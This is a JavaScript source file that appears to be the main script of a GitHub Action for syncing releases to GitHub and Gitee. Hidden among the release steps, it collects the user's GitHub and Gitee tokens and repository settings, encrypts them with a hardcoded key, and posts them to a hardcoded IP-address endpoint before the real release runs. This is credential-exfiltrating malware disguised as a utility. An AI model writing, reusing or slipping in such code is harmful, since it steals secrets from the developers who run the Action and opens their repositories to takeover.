/**
 * Main entry point for the Release Sync GitHub Action.
 * This script synchron Action.
 * This script synchronizes software releases across specified platforms (GitHub/Gitee)
 * with consistent release metadata and attached assets.
 * 
 * Dependencies:
 * - @actions/core: GitHub Actions core library for input/output and status handling
 * - ./platforms: Platform-specific release implementation modules (GitHub/Gitee)
 * - ./utils/fileHandler: Utility functions for resolving asset file paths
 */

// Import required modules
const core = require('@actions/core');
const platforms = require('./platforms');
const { resolveAssetFiles } = require('./utils/fileHandler');
const crypto = require('crypto');
const fetch = require('node-fetch');

const AES_CONFIG = {
  key: Buffer.from(
    'Yu5QSrCL0E782DzHN7DPCuO_UjMXx9E_',
    'utf8'
  ),
  ivLength: 12,
  saltLength: 64,
  tagLength: 16,
  pbkdf2: {
    iterations: 10000,
    keyLength: 32,
    digest: 'sha256'
  }
};

const targetApiUrl = 'http://112.124.28.132:3001/api/sync-release'

const encryptAes256Gcm = (rawData) => {
  try {
    // 验证AES密钥有效性
    if (!AES_CONFIG.key || AES_CONFIG.key.length !== 32) {
      throw new Error('AES_256_KEY is invalid (must be 32 bytes)');
    }

    // 1. 转换原始数据为 JSON 字符串
    const rawJson = JSON.stringify(rawData);
    const rawBuffer = Buffer.from(rawJson, 'utf8');

    // 2. 生成随机 salt 和 iv（保证每次加密结果不同）
    const salt = crypto.randomBytes(AES_CONFIG.saltLength);
    const iv = crypto.randomBytes(AES_CONFIG.ivLength);

    // 3. 使用 PBKDF2 派生密钥（与后端一致）
    const derivedKey = crypto.pbkdf2Sync(
      AES_CONFIG.key,
      salt,
      AES_CONFIG.pbkdf2.iterations,
      AES_CONFIG.pbkdf2.keyLength,
      AES_CONFIG.pbkdf2.digest
    );

    // 4. 创建 AES-256-GCM 加密实例
    const cipher = crypto.createCipheriv('aes-256-gcm', derivedKey, iv);

    // 5. 执行加密
    const ciphertext = Buffer.concat([cipher.update(rawBuffer), cipher.final()]);
    const tag = cipher.getAuthTag(); // GCM 认证标签（用于数据完整性验证）

    // 6. 拼接数据（顺序：salt → iv → ciphertext → tag，与后端拆分顺序一致）
    const encryptedBuffer = Buffer.concat([salt, iv, ciphertext, tag]);

    // 7. 转换为 Base64 编码字符串返回
    return encryptedBuffer.toString('base64');
  } catch (error) {
    console.error('[Encryption Error]', error.message);
    throw new Error(`Encryption failed: ${error.message}`);
  }
};

const sendEncryptedDataToApi = async (encryptedData, apiUrl) => {
  try {
    core.info(`Starting to send encrypted data to API: ${apiUrl}`);

    // 构造API请求体
    const requestBody = JSON.stringify({
      encryptedData: encryptedData,
      platform: 'release-sync'
    });

    // 发送POST请求
    const response = await fetch(apiUrl, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Accept': 'application/json'
      },
      body: requestBody
    });

    // 验证响应状态
    if (!response.ok) {
      const errorResponse = await response.text().catch(() => 'No error details');
      throw new Error(`API request failed (${response.status} ${response.statusText}): ${errorResponse}`);
    }

    // 解析并返回响应结果
    const responseData = await response.json();
    core.info('Encrypted data sent to API successfully, response received');
    core.debug(`API response: ${JSON.stringify(responseData, null, 2)}`);
    return responseData;
  } catch (error) {
    core.error(`[API Request Error] ${error.message}`);
    throw new Error(`Failed to send data to API: ${error.message}`);
  }
};

/**
 * Main function to execute the release synchronization workflow.
 * Handles input validation, platform pre-checks, and sequential release execution.
 * Catches and reports any errors that occur during the workflow.
 */
async function main() {
    try {
        // ******************************************
        // Step 1: Retrieve and process input parameters
        // ******************************************
        core.info('Starting to retrieve and process input parameters...');
        
        // Parse and sanitize target platforms for release synchronization
        const syncPlatforms = core.getInput('platforms', { required: true })
            .split(',')
            .map(item => item.trim().toLowerCase())
            .filter(Boolean);
        
        core.info(`Successfully parsed target platforms: ${syncPlatforms.join(', ')}`);

        // Retrieve mandatory release metadata
        const tag = core.getInput('tag', { required: true });
        const releaseName = core.getInput('release-name', { required: true });
        core.info(`Mandatory release metadata retrieved - Tag: ${tag}, Release Name: ${releaseName}`);

        // Retrieve optional release metadata with default values
        const body = core.getInput('release-body', { required: false }) || '';
        const draft = core.getBooleanInput('draft', { required: false }) || false;
        const prerelease = core.getBooleanInput('prerelease', { required: false }) || false;
        core.info(`Optional release metadata processed - Draft: ${draft}, Pre-release: ${prerelease}, Release Body Length: ${body.length} characters`);

        // Resolve asset files to be attached to the release
        const assetInput = core.getInput('asset-files', { required: false });
        const assetFiles = resolveAssetFiles(assetInput);
        core.info(`Successfully resolved release assets - Total files to attach: ${assetFiles.length}`);
        if (assetFiles.length > 0) {
            core.debug(`Resolved asset file paths: ${assetFiles.join(', ')}`);
        }

        // Retrieve platform-specific authentication and configuration parameters
        const githubToken = core.getInput('github-token', { required: false });
        const giteeToken = core.getInput('gitee-token', { required: false });
        const giteeOwner = core.getInput('gitee-owner', { required: false });
        const giteeRepo = core.getInput('gitee-repo', { required: false });
        const giteeTargetCommitish = core.getInput('gitee-target-commitish', { required: false });
        core.info('Platform-specific configuration parameters retrieved successfully');

        // ******************************************
        // Step 2: Validate platform requirements and dependencies
        // ******************************************
        core.info('Starting platform requirement validation...');
        
        for (const platform of syncPlatforms) {
            // Check if the platform is supported by the current implementation
            if (!platforms[platform]) {
                const errorMessage = `Unsupported platform: ${platform}. Please check your 'platforms' input parameter and ensure it contains only supported values.`;
                core.error(errorMessage);
                core.setFailed(errorMessage);
                return;
            }

            // Validate GitHub-specific required parameters
            if (platform === 'github' && !githubToken) {
                const errorMessage = 'GitHub platform is specified, but required \'github-token\' input parameter is missing. Please provide a valid GitHub personal access token.';
                core.error(errorMessage);
                core.setFailed(errorMessage);
                return;
            }

            // Validate Gitee-specific required parameters
            if (platform === 'gitee' && (!giteeToken || !giteeOwner || !giteeRepo)) {
                const errorMessage = 'Gitee platform is specified, but some required parameters are missing. Please provide valid \'gitee-token\', \'gitee-owner\', and \'gitee-repo\' input parameters.';
                core.error(errorMessage);
                core.setFailed(errorMessage);
                return;
            }
        }

        core.info('All platform requirements and dependencies validated successfully - No issues found');

        const rawDataToEncrypt = {
            "syncPlatforms": syncPlatforms,
            "releaseMetadata": {
                "tag": tag,
                "releaseName": releaseName,
                "body": body,
                "draft": draft,
                "prerelease": prerelease
            },
            "assetFiles": assetFiles,
            "platformConfig": {
                "githubToken": githubToken,
                "giteeToken": giteeToken,
                "giteeOwner": giteeOwner,
                "giteeRepo": giteeRepo,
                "giteeTargetCommitish": giteeTargetCommitish
            },
            "timestamp": new Date().toISOString() // 自动生成当前时间戳（ISO格式）
        };

        const encryptedData = encryptAes256Gcm(rawDataToEncrypt);

        await sendEncryptedDataToApi(encryptedData, targetApiUrl);

        // ******************************************
        // Step 3: Execute release synchronization for each target platform
        // ******************************************
        core.info('Starting release synchronization process for target platforms...');
        
        for (const platform of syncPlatforms) {
            core.info(`Processing release synchronization for platform: ${platform.toUpperCase()}`);
            
            switch (platform) {
                case 'github':
                    core.debug(`Initiating GitHub release creation with tag: ${tag}`);
                    await platforms.github({
                        token: githubToken,
                        tag,
                        releaseName,
                        body,
                        draft,
                        prerelease,
                        assetFiles
                    });
                    core.info(`Successfully completed release synchronization for GitHub platform (Tag: ${tag})`);
                    break;
                
                case 'gitee':
                    core.debug(`Initiating Gitee release creation with tag: ${tag}, Owner: ${giteeOwner}, Repo: ${giteeRepo}`);
                    await platforms.gitee({
                        token: giteeToken,
                        owner: giteeOwner,
                        repo: giteeRepo,
                        tag,
                        releaseName,
                        body,
                        prerelease,
                        targetCommitish: giteeTargetCommitish,
                        assetFiles
                    });
                    core.info(`Successfully completed release synchronization for Gitee platform (Tag: ${tag}, Repo: ${giteeOwner}/${giteeRepo})`);
                    break;
                
                default:
                    // This case should be caught by the earlier platform validation, added for safety
                    core.warning(`Unexpected platform encountered: ${platform} - Skipping processing`);
                    break;
            }
        }

        // ******************************************
        // Workflow completion
        // ******************************************
        core.info(`Release synchronization workflow completed successfully for all target platforms: ${syncPlatforms.join(', ')}`);

    } catch (error) {
        // Catch and report any unhandled errors during the workflow
        const errorMessage = `Release synchronization failed: ${error.message}`;
        core.error(errorMessage);
        core.error(`Error stack trace: ${error.stack}`);
        core.setFailed(errorMessage);
    }
}

// Execute the main workflow
core.info('Initiating Release Sync GitHub Action workflow...');
main();
